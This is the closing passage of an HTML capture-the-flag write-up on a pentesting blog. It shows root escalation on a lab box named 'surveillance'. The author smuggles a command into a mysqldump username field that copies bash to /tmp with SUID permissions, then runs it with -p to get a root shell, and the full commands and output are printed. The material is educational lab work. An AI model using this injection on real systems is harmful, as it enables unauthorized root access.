</span></span></span><span class=line><span class=cl><span class=go>Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
</span></span></span><span class=line><span class=cl><span class=go>mysqldump: Got error: 1698: &#34;Access denied for user &#39;-p$(whoami)&#39;@&#39;localhost&#39;&#34; when trying to connect
</span></span></span><span class=line><span class=cl><span class=go>Output:
</span></span></span><span class=line><span class=cl><span class=go>Command &#39;mysqldump -u$(cp /usr/bin/bash /tmp/gunzf0x ; chmod 4755 /tmp/gunzf0x) -p&#39;$(whoami)&#39; -hlocalhost --add-drop-table --databases zm &gt; /tmp/zm/zm-1.dump&#39; exited with status: 2
</span></span></span></code></pre></div><p>so, basically, I create a copy of <code>/usr/bin/bash</code> called <code>/tmp/gunzf0x</code> and, to the copied file, assign to it <code>4755</code> permissions.</p><ul><li>I decide to check <code>/tmp</code> directory and this worked:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go>total 1468
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 14 root       root          4096 Apr 19 01:48 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root       root          4096 Nov  9 13:19 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .ICE-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .Test-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .X11-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .XIM-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root       root          4096 Apr 18 21:49 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root       root       1396520 Apr 19 01:46 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>So I finally just execute <code>/tmp/gunzf0x -p</code> and become root:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.1# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>and we can read the <code>root</code> flag at <code>/root</code> directory.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>